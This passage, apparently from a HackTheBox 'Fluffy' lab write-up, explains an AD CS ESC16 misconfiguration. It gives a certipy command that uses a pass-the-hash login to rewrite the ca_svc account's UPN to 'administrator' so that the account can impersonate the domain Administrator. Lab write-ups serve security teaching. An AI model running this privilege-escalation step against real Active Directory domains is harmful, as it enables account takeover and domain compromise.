Looking at the output we found that this CA is vulnerable to ESC16. Every certificate issued with this CA will lack of the SID extension `szOID_NTDS_CA_SECURITY_EXT`. 
We are able to impersonate the Administrator account by editing an account's UPN. 

Let's replace the UPN of `ca_svc` with `administrator`. 
```
exegol-Fluffy /workspace # certipy account \
    -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' \
    -dc-ip '10.129.1.191' -upn 'administrator' \
    -user 'ca_svc' update
```
